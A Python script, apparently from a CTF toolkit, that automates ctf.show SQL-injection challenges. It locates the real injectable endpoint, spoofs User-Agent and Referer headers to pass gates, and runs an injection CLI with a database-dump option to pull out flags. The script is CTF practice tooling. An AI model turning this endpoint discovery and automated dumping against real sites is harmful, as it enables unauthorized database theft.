"""ctf.show 单题一键作战：boot → 定位真实入口 → 定向分析/脱库 → 一行战报。

为什么需要它：ctf.show 每题容器的真实注入入口不是固定的 `/api/`，而是
`select-no-waf-N.php` 页面里 `action="api/vN.php"` 指定的路径（N 随题号变）。
直接拿 `/api/?id=1` 去打会得到 404 并白白跑完整套探测（web173 实测烧了 163s）。

用法：
  python scripts/ctfshow_battle.py web176
  python scripts/ctfshow_battle.py web176 --verbose      # 打印全部请求日志
  python scripts/ctfshow_battle.py web176 --budget 90    # 单题预算（秒）
"""
from __future__ import annotations

import argparse
import os
import re
import subprocess
import sys
import time
import urllib.parse

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, HERE)

from ctfshow_runner import Api, by_name, challenges, load_cookie  # noqa: E402

RUNS = os.path.join(ROOT, "runs")
FLAG_RE = re.compile(r"(?:ctfshow|flag|CTF|FLAG)\{[^}\s'\"]{1,120}\}")
SQL_RE = re.compile(r"\$sql\s*=\s*\"([^\"]{5,400})\"")
ACTION_RE = re.compile(r'<div[^>]*class="[^"]*layui-form[^"]*"[^>]*action="([^"]+)"')
FALLBACK_ACTION_RE = re.compile(r'action="([^"]+\.php[^"]*)"')
INPUT_RE = re.compile(r'<input[^>]*name="([^"]+)"', re.I)


def http_get(url: str, cookie: str, headers: dict | None = None) -> tuple[int, str]:
    import urllib.request
    h = {"Cookie": "session=" + cookie,
         "User-Agent": "Mozilla/5.0 AutoSQLi-battle"}
    h.update(headers or {})
    req = urllib.request.Request(url, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def _gate_headers(body: str, headers: dict) -> dict:
    """ctf.show sqlmap 模块常见网关：先查 UA，再查 Referer。

    返回的提示文案很直白：「不使用sqlmap是没有灵魂的」→ 要求 UA 含 sqlmap；
    「你都不是从ctf.show来的」→ 要求 Referer 指向 ctf.show。
    """
    h = dict(headers)
    if "sqlmap" in body and "User-Agent" not in h:
        h["User-Agent"] = "sqlmap/1.5.12#stable (http://sqlmap.org)"
    if "ctf.show" in body and "Referer" not in h:
        h["Referer"] = "https://ctf.show/"
    return h


def probe_json(url: str, method: str, param: str, cookie: str,
               headers: dict) -> tuple[bool, dict, str]:
    """探测接口是否返回 {"code":..}；被 UA/Referer 网关拦住时自动补头重试。"""
    for _ in range(3):
        if method.upper() == "GET":
            s, body = http_get(f"{url}?{param}=1", cookie, headers)
        else:
            s, body = http_post(url, {param: "1"}, cookie, headers, method=method)
        if s == 200 and body.lstrip().startswith('{"code"'):
            return True, headers, body
        new = _gate_headers(body, headers)
        if new == headers:
            break
        headers = new
    return False, headers, ""


def _has_data(body: str) -> bool:
    """接口是否真的查到了行（web202 的 GET 恒返回空 data，不能只看 JSON 前缀）。"""
    import json as _json
    try:
        return bool(_json.loads(body).get("data"))
    except Exception:      # noqa: BLE001
        return False


def _result(url, param, method, html, fields=None, headers=None):
    sm = SQL_RE.search(html)
    fm = re.search(r"function\s+waf\s*\([^)]*\)\s*\{([^}]{0,300})\}", html) \
        or re.search(r"preg_match\s*\([^\n]{0,180}", html)
    return {"url": url, "param": param, "method": method,
            "sql": sm.group(1) if sm else "",
            "filt": fm.group(0) if fm else "",
            "fields": fields or {}, "headers": headers or {}}


def resolve_entry(base: str, name: str, cookie: str) -> dict:
    """定位真实注入入口。

    返回 dict：url / param / method / sql / filt / fields（POST 时需要一并提交的
    其他字段，如登录框的 password；注入参数本身由 CLI 负责 fuzz）。
    """
    base = base.rstrip("/") + "/"
    status, index = http_get(base, cookie)
    if status != 200:
        raise RuntimeError(f"容器首页 {status}，容器可能未就绪")

    m = re.match(r"web(\d+)", name, re.I)
    guess = int(m.group(1)) - 170 if m else 0
    # 入口页链接先收集（web171-175 是 select-no-waf-N.php，web176 起变成
    # select-waf.php，所以不能只靠题号推算）
    links = [p for p in re.findall(r'href="([^"?]+\.php)"', index)
             if "index.php" not in p]
    links = list(dict.fromkeys(links))
    links.sort(key=lambda p: (0 if "select" in p.lower() else 1, p))
    pages = []
    if guess > 0:
        pages.append(f"select-no-waf-{guess}.php")
    pages += links
    pages += sorted(set(re.findall(r'(select-[a-z0-9-]*\d+\.php)', index)),
                    key=lambda p: -int(re.search(r"(\d+)\.php", p).group(1)))

    last_err = "无候选页面"
    for page in pages:
        s, html = http_get(base + page, cookie)
        if s != 200:
            last_err = f"{page} -> {s}"
            continue
        # 源码级侦察：参数名/请求方式优先从 PHP 源码里的 $_POST['x'] 读，
        # 比猜表单可靠（web183 起页面干脆没有 <form>，只有 $sql 和返回值）
        pm = re.search(r"\$_(POST|GET|REQUEST)\[\s*['\"](\w+)['\"]\s*\]", html)
        src_method = "POST" if pm and pm.group(1) in ("POST", "REQUEST") else "GET"
        inputs = list(dict.fromkeys(INPUT_RE.findall(html)))
        if pm:
            param = pm.group(2)
        else:
            param = inputs[0] if inputs else "id"
        # 登录框类：其余字段给固定合法值，否则 PHP 侧 is_numeric/password 检查直接 die
        fields = {k: ("0" if "pass" in k.lower() else "admin")
                  for k in inputs if k != param}

        am = ACTION_RE.search(html) or FALLBACK_ACTION_RE.search(html)
        js_url = re.search(r"url\s*:\s*['\"]([^'\"]+)['\"]", html)
        if js_url:
            # 很多题把接口写在 JS 的 $.ajax({url:'api/'}) 里，页面本身没有 form action
            cand2 = urllib.parse.urljoin(base + page, js_url.group(1))
            ok, hdrs, _ = probe_json(cand2, "POST", param, cookie, {})
            if ok:
                return _result(cand2, param, "POST", html, fields, hdrs)
        if not am:
            # 没有 form action（PHP 自提交页）：直接打页面本身
            ok, hdrs, _ = probe_json(base + page, src_method, param, cookie, {})
            if ok:
                return _result(base + page, param, src_method, html, fields, hdrs)
            last_err = f"{page} 自提交页探测失败"
            continue
        action = urllib.parse.urljoin(base + page, am.group(1) or (base + page))
        # 页面写的 action 不一定真实可用（web174 写 api/v2.php，真接口是 api/v4.php），
        # 逐个候选实测：返回 {"code":..} 的才是真接口
        cands = [action, urllib.parse.urljoin(action, "./"), base + page]
        # api/ 目录索引在部分题里不认自定义方法，真正的入口是 api/index.php（web203）
        for extra in ("api/index.php", "api/"):
            cands.append(urllib.parse.urljoin(base, extra))
        for n in ([guess - 1, guess, guess + 1, guess + 2] if guess else []):
            cands.append(urllib.parse.urljoin(base, f"api/v{n}.php"))
        real, hdrs, method, fallback = "", {}, "GET", None
        for cand in dict.fromkeys(cands):
            if not cand:
                continue
            for m in ("GET", "POST", "PUT"):
                # PUT 类网关要求 Content-Type: text/plain（web203 实测）
                h0 = {"Content-Type": "text/plain"} if m == "PUT" else {}
                ok, h, body = probe_json(cand, m, param, cookie, h0)
                if ok and _has_data(body):
                    real, hdrs, method = cand, h, m
                    break
                if ok and fallback is None:
                    fallback = (cand, m, h)
            if real:
                break
        if not real and fallback:
            real, method, hdrs = fallback[0], fallback[1], fallback[2]
        if not real:
            last_err = f"{page} 的 action {action} 及候选接口均未返回 JSON"
            continue
        return _result(real, param, method, html, fields, hdrs)
    raise RuntimeError(f"定位入口失败：{last_err}")


def http_post(url: str, data: dict, cookie: str,
              headers: dict | None = None, method: str = "POST") -> tuple[int, str]:
    import urllib.parse as up
    import urllib.request
    body = up.urlencode(data).encode()
    h = {"Cookie": "session=" + cookie,
         "User-Agent": "Mozilla/5.0 AutoSQLi-battle",
         "Content-Type": "application/x-www-form-urlencoded"}
    h.update(headers or {})
    req = urllib.request.Request(url, data=body, headers=h, method=method.upper())
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def stream_cli(url: str, param: str, method: str, fields: dict, headers: dict,
               budget: int, verbose: bool, log_path: str) -> tuple[int, str]:
    cmd = [sys.executable, "-u", "-m", "autosqli.cli", "-u", url, "-p", param,
           "--dump", "--fast", "--max-seconds", str(budget), "--timeout", "12",
           "--workers", "8", "--max-rows", "60"]
    if method.upper() != "GET":
        data = [f"{param}=1"] + [f"{k}={v}" for k, v in (fields or {}).items()]
        cmd += ["--method", method.upper(), "--data", *data]
    if headers:
        cmd += ["--header", *[f"{k}={v}" for k, v in headers.items()]]
    keep = re.compile(r"\[进度\]|注入点|指纹:|\[FLAG\]|\[WARN\]|\[ERROR\]|通道|请求数|"
                      r"脱库结果|已过滤|✗|★")
    out, t0 = [], time.time()
    with open(log_path, "w", encoding="utf-8") as lf:
        p = subprocess.Popen(cmd, cwd=ROOT, stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT, text=True,
                             encoding="utf-8", errors="replace", bufsize=1)
        for line in p.stdout:
            lf.write(line)
            out.append(line)
            if verbose or keep.search(line):
                text = line.rstrip()
                # 含 flag 的行不截断：战报要能直接复制
                if not FLAG_RE.search(text):
                    text = text[:160]
                print("   " + text, flush=True)
            if time.time() - t0 > budget + 30:
                p.kill()
                print("   ⏱ 超预算强杀", flush=True)
                break
        p.wait()
    return p.returncode, "".join(out)


def wait_ready(base: str, cookie: str, timeout: float = 40.0) -> bool:
    """容器创建后有几秒不可用（首页 404/502），轮询到 200 再解析入口。"""
    t0 = time.time()
    while time.time() - t0 < timeout:
        status, _ = http_get(base.rstrip("/") + "/", cookie)
        if status == 200:
            return True
        time.sleep(2)
    return False


def main(argv=None):
    for stream in (sys.stdout, sys.stderr):
        if hasattr(stream, "reconfigure"):
            stream.reconfigure(encoding="utf-8", errors="replace")
    ap = argparse.ArgumentParser(description="ctf.show 单题一键作战")
    ap.add_argument("name", help="题名，如 web176")
    ap.add_argument("--cookie-file", default=os.environ.get("CTFSHOW_COOKIE_FILE", ""))
    ap.add_argument("--budget", type=int, default=90, help="单题秒数预算（默认 90）")
    ap.add_argument("--verbose", action="store_true")
    args = ap.parse_args(argv)

    cookie = load_cookie(args.cookie_file)
    api = Api(cookie)
    c = by_name(challenges(api, "sql注入"), args.name)
    os.makedirs(RUNS, exist_ok=True)
    log_path = os.path.join(RUNS, f"{c['name']}.log")

    t0 = time.time()
    from ctfshow_runner import ensure_container
    base = ensure_container(api, c["id"])
    print(f"[{c['name']}] 容器 {base}（{(time.time() - t0):.0f}s）", flush=True)
    if not wait_ready(base, cookie):
        print(f"[{c['name']}] ❌ 容器 40s 内未就绪", flush=True)
        return 2

    try:
        res = resolve_entry(base, c["name"], cookie)
    except Exception as e:
        print(f"[{c['name']}] ❌ 入口定位失败: {e}", flush=True)
        return 2
    target, param, method = res["url"], res["param"], res["method"]
    print(f"[{c['name']}] 入口 {method} {target}  参数 {param}"
          + (f"  附带字段 {res['fields']}" if res["fields"] else "")
          + (f"  请求头 {res['headers']}" if res["headers"] else ""), flush=True)
    if res["sql"]:
        print(f"[{c['name']}] 源码 {res['sql'][:150]}", flush=True)
    if res["filt"]:
        print(f"[{c['name']}] 过滤 {res['filt'][:150]}", flush=True)

    rc, out = stream_cli(target, param, method, res["fields"], res["headers"],
                         args.budget, args.verbose, log_path)
    flags = list(dict.fromkeys(FLAG_RE.findall(out)))
    tech = re.search(r"通道: (\w+)", out)
    reqs = re.search(r"请求数: (\d+)", out)
    dt = time.time() - t0
    if flags:
        print(f"[{c['name']}] ✅ {flags[0]} | {tech.group(1) if tech else '-'} "
              f"| {reqs.group(1) if reqs else '?'} 请求 | {dt:.0f}s", flush=True)
    else:
        print(f"[{c['name']}] ❌ 未出 flag | rc={rc} | {dt:.0f}s | 日志 {log_path}", flush=True)
    return 0 if flags else 1


if __name__ == "__main__":
    sys.exit(main())
